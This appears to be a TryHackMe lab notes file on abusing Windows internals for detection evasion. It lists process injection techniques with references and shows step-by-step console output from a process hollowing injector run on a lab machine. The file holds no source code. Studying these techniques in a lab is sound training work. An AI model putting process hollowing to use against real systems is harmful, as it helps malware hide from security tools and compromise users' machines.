# TryHackMe-Abusing-Windows-Internals
[Abusing Windows Internals](https://tryhackme.com/room/abusingwindowsinternals)

Leverage windows internals components to evade common detection solutions, using modern tool-agnostic approaches
1. [Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
2. [Process Injection: Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/)
3. [Process Injection: Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/)
4. [Process Injection: Portable Executable Injection](https://attack.mitre.org/techniques/T1055/002/)
5. [Process Injection](https://attack.mitre.org/techniques/T1055/)
6. [Asynchronous Procedure Calls](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
7. [How TrickBot Malware Hooking Engine Targets Windows 10 Browsers - SentinelLabs](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)

```
C:\Users\THM-Attacker\Desktop\Injectors>hollowing-injector.exe 3364
[+] Created victim process
        [*] PID 5100
[+] Replacement executable opened
        [*] Size 103424 bytes
[+] Read replacement executable into memory
        [*] In current process at 0x001d0000
[+] Obtained context from victim process's primary thread
        [*] Victim PEB address / EBX = 0x0046b000
        [*] Victim entry point / EAX = 0x00ce36d0
[+] Extracted image base address of victim process
        [*] Address: 0x00ce0000
[+] Hollowed out victim executable via NtUnmapViewOfSection
        [*] Utilized base address of 0x00ce0000
[+] Replacement image metadata extracted
        [*] replacementImageBaseAddress = 0x00400000
        [*] Replacement process entry point = 0x00001268
[+] Allocated memory in victim process
        [*] pVictimHollowedAllocation = 0x00ce0000
        [*] Headers written into victim process
        [*] Section .text written into victim process at 0x00ce1000
                [*] Replacement section header virtual address: 0x00001000
                [*] Replacement section header pointer to raw data: 0x00000400
        [*] Section .rdata written into victim process at 0x00ce2000
                [*] Replacement section header virtual address: 0x00002000
                [*] Replacement section header pointer to raw data: 0x00001200
        [*] Section .data written into victim process at 0x00ce3000
                [*] Replacement section header virtual address: 0x00003000
                [*] Replacement section header pointer to raw data: 0x00001e00
        [*] Section .rsrc written into victim process at 0x00ce4000
                [*] Replacement section header virtual address: 0x00004000
                [*] Replacement section header pointer to raw data: 0x00002000
        [*] Section .reloc written into victim process at 0x00cfc000
                [*] Replacement section header virtual address: 0x0001c000
                [*] Replacement section header pointer to raw data: 0x00019200
[+] Victim process entry point set to replacement image entry point in EAX register
        [*] Value is 0x00ce1268
[+] Resuming victim process primary thread...
[+] Cleaning up

C:\Users\THM-Attacker\Desktop\Injectors>
```
